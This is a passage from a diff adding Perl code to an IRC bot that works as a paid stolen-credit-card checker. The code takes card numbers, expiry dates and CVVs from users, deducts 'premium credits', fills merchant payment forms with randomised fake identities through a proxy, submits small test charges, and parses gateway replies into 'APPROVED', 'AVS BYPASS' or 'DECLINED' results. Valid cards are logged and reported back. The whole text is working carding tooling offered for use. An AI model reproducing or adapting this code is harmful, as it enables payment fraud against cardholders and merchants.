+                    my $var1 = substr($expmes,0,2);
+		                my $var2 = substr($expmes,2,4);
+                    
+                    my $m = substr($expmes,0,2);
+                    my $y = substr($expmes,2,4);
+                    if ($m == "01"){$m = "1";}
+                    if ($m == "02"){$m = "2";}
+                    if ($m == "03"){$m = "3";}
+                    if ($m == "04"){$m = "4";}
+                    if ($m == "05"){$m = "5";}
+                    if ($m == "06"){$m = "6";}
+                    if ($m == "07"){$m = "7";}
+                    if ($m == "08"){$m = "8";}
+                    if ($m == "09"){$m = "9";}
+		    my $range = 10;
+                    my $minimum = 1;
+                    my $curs = '$';
+                    my $random_number = int(rand($range)) + $minimum;
+		    my $urutan = 80;
+                    my $minimal = 1;
+                    my $nomor_acak = int(rand($urutan)) + $minimal;
+                    open FILE,"pmerchant.txt";
+                    @array=<FILE>;
+                    close FILE;
+                    $pmerchant=$array[rand @array];
+    		    ################## RANDOM IDENTITY ##################
+    		    open FILE,"Random/fname.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $firstname =$array[rand @array];
+    		    open FILE,"Random/lname.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $lastname=$array[rand @array];
+    		    open FILE,"Random/address.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $address=$array[rand @array];
+    		    open FILE,"Random/city.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $city=$array[rand @array];
+    		    open FILE,"Random/states.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $states=$array[rand @array];
+    		    open FILE,"Random/states_prex.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $states_prex=$array[rand @array];
+    		    open FILE,"Random/zip.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $zip=$array[rand @array];
+    		    open FILE,"Random/phone.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $phone=$array[rand @array];
+    		    open FILE,"Random/email.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $email=$array[rand @array];
+		    ############### DETECT NICK ###############
+		    open FILE,"premium.txt";
+    		    my @results = <FILE>;
+                    close FILE;
+		    my $chknickVar = 0;
+		    foreach my $url (@results){
+		    if($url =~ m/$nick/ && $chknickVar == 0) {
+    		    $chknickVar = 1;
+		    }
+    		    }
+    		    if($chknickVar == 0){
+                    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Sorry, You're not Premium User! 0- 3Please Contact $master ", $nick );
+		    goto Akhir;
+		    }
+		    ########## CHECKING PREMIUM CREDITS ##########
+    		    open(FILE, "+<premium.txt") or die "$! error";
+    		    my @results = <FILE>;
+    		    close FILE;
+		    my $chkcreditVar = 0;
+    		    foreach my $url (@results){
+    		    if($url =~ m/$nick\|0/ && $chkcreditVar == 0) {
+		    $chkcreditVar = 1;
+    		    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Access Denied! 0-8 Premium Credit 0:9 0 0- 3Please Top Up Your Premium Credit! ", $nick );
+    		    goto Akhir;
+		    }
+		    }
+		    ######### PREMIUM CREDITS #########
+		    my $fredatabase = "premium.txt";
+		    open FILE,"$fredatabase";
+		    my @results = <FILE>;
+		    close FILE;
+		    my $freinfo = $1;
+		    my $frevar = 0;
+
+		    foreach my $url(@results) {
+		    if($url =~ m/$nick\|(.*)/ && $frevar == 0) {
+		    $freevar = 1;
+		    $frebalance = $1;
+		    if($frebalance >= 1) {
+		    $mychkvar = 1;
+		    $balance = $frebalance - 1;
+
+		    my $filename = 'premium.txt';
+		    my $data = read_file($filename);
+		    $data =~ s/$nick\|$frebalance/$nick\|$balance/g;
+		    write_file($filename, $data);
+		    }
+		    }
+		    }
+		    ###############################################
+                    ##################### TYPE CARD #####################
+                      if (substr($card,0,1)==4) {
+                       $cctype = "V";
+                       }
+                       if (substr($card,0,1)==5) {
+                       $cctype = "M";
+                        }
+                       if (substr($card,0,1)==6) {
+                        $cctype = "D";
+                        }
+                       if (substr($card,0,1)==3) {
+                       $cctype = "A";
+                       }
+                         ###############################################
+ my $agent = WWW::Mechanize->new( autocheck => 1,ssl_opts => {verify_hostname => 0},);
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+### By Payment Tor Proxy
+ $agent->env_proxy();
+    $agent->get(''.$pmerchant.'');
+    $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+{ local $^W; $agent->current_form->value('first_name', 'todd'); };
+{ local $^W; $agent->current_form->value('last_name', 'smith'); };
+{ local $^W; $agent->current_form->value('address', '2010 Magnolia Drive'); };
+{ local $^W; $agent->current_form->value('city', 'boston'); };
+{ local $^W; $agent->current_form->value('state', 'MA'); };
+{ local $^W; $agent->current_form->value('zip', '05544'); };
+{ local $^W; $agent->current_form->value('email', 'xxXciyuliveraXxx@gmail.com'); };
+{ local $^W; $agent->current_form->value('amount', '5'); };
+{ local $^W; $agent->current_form->value('x_card_num', ''.$card.''); };
+if ($m=='01') { local $^W; $agent->current_form->value('exp_month','1'); };
+if ($m=='02') { local $^W; $agent->current_form->value('exp_month','2'); };
+if ($m=='03') { local $^W; $agent->current_form->value('exp_month','3'); };
+if ($m=='04') { local $^W; $agent->current_form->value('exp_month','4'); };
+if ($m=='05') { local $^W; $agent->current_form->value('exp_month','5'); };
+if ($m=='06') { local $^W; $agent->current_form->value('exp_month','6'); };
+if ($m=='07') { local $^W; $agent->current_form->value('exp_month','7'); };
+if ($m=='08') { local $^W; $agent->current_form->value('exp_month','8'); };
+if ($m=='09') { local $^W; $agent->current_form->value('exp_month','9'); };
+if ($m=='10') { local $^W; $agent->current_form->value('exp_month','10'); };
+if ($m=='11') { local $^W; $agent->current_form->value('exp_month','11'); };
+if ($m=='12') { local $^W; $agent->current_form->value('exp_month','12'); };
+{ local $^W; $agent->current_form->value('exp_year', '20'.$y.''); };
+{ local $^W; $agent->current_form->value('x_card_code', ''.$verifica.''); };
+{ local $^W; $agent->current_form->value('card_type', ''.$cctype.''); };
+$agent->submit();
+
+    #print $agent->content,"\n";
+    my $allo=$agent->content;
+print "[+] Checking Private $numerocarta $expmes $verifica";
+############################################################################################################
+    if ($allo =~/The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder./){
+print "\t\t\t[Valid]\n";
+addlog("ccaproved.txt", "!cc $numerocarta $expmes $verifica ");
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/this transaction has been approved/){
+addlog("ccaproved.txt", "!cc $card $m$y $verifica ");
+print "\t\t\t[Valid]\n";
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS BYPASS 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 9[0,1AVS BYPASS9] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS BYPASS 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 9[0,1AVS BYPASS9] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/An error occurred during processing./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/A duplicate transaction has been submitted./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: Card Submitted - 4[0,1CARD REJECTED4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: Card Submitted - 4[0,1CARD REJECTED4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card has expired./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction cannot be accepted at this time./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The merchant does not accept this type of credit card./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    }
+    }
+    if($bank == 0){
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction has been declined./){
+print "\t\t\t[CC Declined]\n";
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVSMG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    #addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your order has been received. Thank you for your business!/){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-4 MERCHANT DOWN 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card number is invalid./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD NUMBER INVALID14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    print "card $variable!";
+    }
+    }
+    }elsif ($allo =~/Credit card expiration date is invalid./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7CARD EXPIRED14,1 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+    }
+################################################################################################################################################
+
+################################################################################################################################################
+################################################ ANOTHER TYPE CARD OR PREMIUM USER #############################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /\.card\s+(\b[4536][0-9]{13,16}\b)\s+(\d{4})\s+(\b[0-9]{3,4}\b)/){
+		    if($auto == 1){
+                    ##Coded By Payment Tor Restart & Start
+                    #$tor = service('tor restart');
+                    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Note : !cc work on private msg only ", $nick );
+                     ##Fixed Bug !cc By Payment
+                    my ($numerocarta,$expmes,$verifica,$amount) = ($1,$2,$3,$4,$5,);
+                    my $var1 = substr($expmes,0,2);
+		                my $var2 = substr($expmes,2,4);
+                    my ($card,$expmes,$verifica) = ($1,$2,$3);
+                    my $m = substr($expmes,0,2);
+                    my $y = substr($expmes,2,4);
+                    if ($m == "01"){$m = "1";}
+                    if ($m == "02"){$m = "2";}
+                    if ($m == "03"){$m = "3";}
+                    if ($m == "04"){$m = "4";}
+                    if ($m == "05"){$m = "5";}
+                    if ($m == "06"){$m = "6";}
+                    if ($m == "07"){$m = "7";}
+                    if ($m == "08"){$m = "8";}
+                    if ($m == "09"){$m = "9";}
+		    my $range = 10;
+                    my $minimum = 1;
+                    my $curs = '$';
+                    my $random_number = int(rand($range)) + $minimum;
+		    my $urutan = 80;
+                    my $minimal = 1;
+                    my $nomor_acak = int(rand($urutan)) + $minimal;
+                    open FILE,"merchant.txt";
+                    @array=<FILE>;
+                    close FILE;
+                    $merchant=$array[rand @array];
+    		    ################## RANDOM IDENTITY ##################
+    		    open FILE,"Random/fname.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $firstname =$array[rand @array];
+    		    open FILE,"Random/lname.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $lastname=$array[rand @array];
+    		    open FILE,"Random/address.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $address=$array[rand @array];
+    		    open FILE,"Random/city.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $city=$array[rand @array];
+    		    open FILE,"Random/states.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $states=$array[rand @array];
+    		    open FILE,"Random/states_prex.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $states_prex=$array[rand @array];
+    		    open FILE,"Random/zip.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $zip=$array[rand @array];
+    		    open FILE,"Random/phone.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $phone=$array[rand @array];
+    		    open FILE,"Random/email.txt";
+    		    @array=<FILE>;
+    		    close FILE;
+    		    $email=$array[rand @array];
+		    ############### DETECT NICK ###############
+		    open FILE,"premium.txt";
+    		    my @results = <FILE>;
+                    close FILE;
+		    my $chknickVar = 0;
+		    foreach my $url (@results){
+		    if($url =~ m/$nick/ && $chknickVar == 0) {
+    		    $chknickVar = 1;
+		    }
+    		    }
+    		    if($chknickVar == 0){
+                    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Sorry, You're not Premium User! 0- 3Please Contact $master ", $nick );
+		    goto Akhir;
+		    }
+		    ########## CHECKING PREMIUM CREDITS ##########
+    		    open(FILE, "+<premium.txt") or die "$! error";
+    		    my @results = <FILE>;
+    		    close FILE;
+		    my $chkcreditVar = 0;
+    		    foreach my $url (@results){
+    		    if($url =~ m/$nick\|0/ && $chkcreditVar == 0) {
+		    $chkcreditVar = 1;
+    		    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Access Denied! 0-8 Premium Credit 0:9 0 0- 3Please Top Up Your Premium Credit! ", $nick );
+    		    goto Akhir;
+		    }
+		    }
+		    ######### PREMIUM CREDITS #########
+		    my $fredatabase = "premium.txt";
+		    open FILE,"$fredatabase";
+		    my @results = <FILE>;
+		    close FILE;
+		    my $freinfo = $1;
+		    my $frevar = 0;
+
+		    foreach my $url(@results) {
+		    if($url =~ m/$nick\|(.*)/ && $frevar == 0) {
+		    $freevar = 1;
+		    $frebalance = $1;
+		    if($frebalance >= 1) {
+		    $mychkvar = 1;
+		    $balance = $frebalance - 1;
+
+		    my $filename = 'premium.txt';
+		    my $data = read_file($filename);
+		    $data =~ s/$nick\|$frebalance/$nick\|$balance/g;
+		    write_file($filename, $data);
+		    }
+		    }
+		    }
+		    ###############################################
+                    ##################### TYPE CARD #####################
+                      if (substr($card,0,1)==4) {
+                       $cctype = "V";
+                       }
+                       if (substr($card,0,1)==5) {
+                       $cctype = "M";
+                        }
+                       if (substr($card,0,1)==6) {
+                        $cctype = "D";
+                        }
+                       if (substr($card,0,1)==3) {
+                       $cctype = "A";
+                       }
+                         ###############################################
+ my $agent = WWW::Mechanize->new( autocheck => 1,ssl_opts => {verify_hostname => 0},);
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+### By Payment Tor Proxy
+ $agent->env_proxy();
+    $agent->get('http://localhost/paypal/index.php');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+     $agent->form_number(1);
+  #{ local $^W; $agent->current_form->value('amt', '1'); };
+{ local $^W; $agent->current_form->value('ftotal', '1.00'); };
+ { local $^W; $agent->current_form->value('fname', ''.$firstname.''); };
+ { local $^W; $agent->current_form->value('lname', ''.$lastname.''); };
+ { local $^W; $agent->current_form->value('SIGNATURE', 'Abg0gYcQyxQvnf2HDJkKtA-p6pqhA1k-KTYE0Gcy1diujFio4io5Vqjf'); };
+ { local $^W; $agent->current_form->value('VERSION', '78'); };
+{ local $^W; $agent->current_form->value('CREDITCARDTYPE', ''.$cctype.''); };
+ { local $^W; $agent->current_form->value('creditCardNumber', ''.$numerocarta.''); };
+ { local $^W; $agent->current_form->value('expDateMonth', ''.$var1.''); };
+ { local $^W; $agent->current_form->value('expDateYear', '20'.$var2.''); };
+ { local $^W; $agent->current_form->value('cvv2Number', ''.$verifica.''); };
+       $agent->submit();
+    print $agent->content,"\n";
+    my $allo=$agent->content;
+print "[+] Checking Private $card $m$y $verifica";
+############################################################################################################
+    if ($allo =~/The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder./){
+print "\t\t\t[Valid]\n";
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Payment Sucess/){
+print "\t\t\t[Valid]\n";
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS BYPASS 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 9[0,1AVS BYPASS9] 0- 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS BYPASS 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 9[0,1AVS BYPASS9] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/An error occurred during processing./){
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance \r\n");
+    #&respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:10 $10- 7Premium Credit 0:9 $balance ");
+    }
+    }
+    if($bank == 0){
+    $irc_socket->write("PRIVMSG $nick 7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: An error occurred during processing - 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED! 0-7 Premium Credit 0:9 $balance \r\n");
